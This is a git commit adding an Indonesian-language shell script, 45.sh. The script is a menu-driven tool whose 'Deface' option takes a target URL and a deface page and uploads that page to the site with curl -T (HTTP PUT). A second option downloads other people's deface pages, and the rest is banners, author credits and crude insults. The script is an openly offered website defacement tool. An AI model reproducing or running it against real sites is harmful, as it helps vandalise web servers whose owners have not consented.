237d1b9f8b2e58af725feacd0caa065c2d90b778
Ramadan3123 <50162096+Ramadan3123@users.noreply.github.com>
2019-05-04 17:35:47 +0000

    Add files via upload

---
+++ 45.sh
@@ -0,0 +1,114 @@
+#usr/bin/sh
+#ngapain liat-liat Tod :p
+#cuman tools sederhana tod :p
+#Gua santet mati lo
+
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+figlet Ramadan alfiansyah | lolcat
+echo $green  " =========================================== "
+echo $red    " = Author  : Ramadan alfiansyah            ="
+echo $purple " = Facebook: Ramadan id                    ="
+echo $indigo " = Youtube : Solo People                   ="
+echo $yellow " = Github  : github.com/Ramadan3123        ="
+echo $cyan   " ==========================================="
+echo $red
+date
+
+echo $yellow "Silakan dipilih njenk "
+echo "••••••••••••••••••••••••••••••••" | lolcat
+echo "•A.Deface                      •" | lolcat
+echo "•B.Nyolong script Deface Orang •" | lolcat
+echo "•C.Info Author                 •" | lolcat
+echo "••••••••••••••••••••••••••••••••" | lolcat
+
+echo $white "╭────"$green"By Ramadan Alfiansyah"
+read -p " ╰────➲ " apaan
+
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+figlet  Deface | lolcat
+echo $green "Masukan Target !!!! "
+echo $white "╭────"$green"By Ramadan Alfiansyah"
+read -p " ╰────➲ "  target
+echo $green "Masukan Script !!!! "
+echo $white "╭────"$green"By Ramadan Alfiansyah"
+read -p " ╰────➲ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "[+]----> = $target/$script "
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+figlet Curi teross | lolcat
+echo " Ingat habis nyuri harus tobat...!!     " | lolcat
+echo $green "Masukan Target !!!! "
+echo $white "╭────"$green"By Ramadan Alfiansyah"
+read -p " ╰────➲ "  target
+echo $green "Simpan dengan nama??(ex: script.html)"
+echo $white "╭────"$green"By Ramadan Alfiansyah"
+read -p " ╰────➲ " simpan
+curl -o $simpan $target
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[C/Q] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+figlet Info       | lolcat
+figlet Author     | lolcat
+ 
+echo "====================================" | lolcat
+echo "= THANKS TO :                      =" | lolcat
+echo "=[+] ALLAH SWT                     =" | lolcat
+echo "=[+] CYBER BULLY SUMUT             =" | lolcat
+echo "=[+] SEPTIA NUR FIKRI              =" | lolcat
+echo "=[+] FAJAR SEKSANA                 =" | lolcat
+echo "=               NOTE               =" | lolcat
+echo "====================================" | lolcat
+echo "=[!] jangan di reedit njink        =" | lolcat
+echo "=[!] soalnya w cape buat nya       =" | lolcat
+echo "====================================" | lolcat
+
+
+echo " ---------->fuck bagi yang reedit<---------- " | lolcat
+echo "                                           "
+echo "                                           "
+echo "                                           "
+echo "                                           "
+echo "                                           "
+
+
+
+
+echo "             # # # # " | lolcat
+echo "             #     # " | lolcat
+echo "             #     # " | lolcat
+echo "             # # # # " | lolcat
+echo "             #     # " | lolcat
+echo "             #     # " | lolcat
+echo "       # # # #     # # # # " | lolcat
+echo "       #     #     #     # " | lolcat
+echo "       #     #     #     # " | lolcat
+echo " # # # #     #     #     # " | lolcat
+echo " #     #     #     #     # " | lolcat
+echo " #     #     #     #     # " | lolcat
+echo " #     #     #     #     # " | lolcat
+echo " #     #     #     #     # " | lolcat
+echo " #                       # " | lolcat
+echo " # By Ramadan alfiansyah # " | lolcat
+echo " #                       # " | lolcat
+echo " # #        note       # # " | lolcat
+echo "   # maaf kalau jelek  #  " | lolcat 
+echo "   # soalnya noob      #  " | lolcat
+echo "   # kalo ngedesign    #  " | lolcat
+echo "   # # # # # # # # # # #  " | lolcat
+fi
